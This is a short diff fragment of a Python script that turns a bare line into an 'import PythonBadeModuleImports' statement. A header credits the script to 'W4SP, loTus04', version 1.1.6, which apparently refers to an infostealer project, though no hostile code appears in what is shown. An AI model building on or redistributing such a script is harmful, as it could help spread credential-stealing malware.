@@ -14,7 +14,7 @@ from zipfile import ZipFile
 import random
 import re
 import subprocess
-PythonBadeModuleImports 
+import PythonBadeModuleImports 
 
 #  THIS IS 1.1.6 VERSION
 #    BY W4SP, loTus04
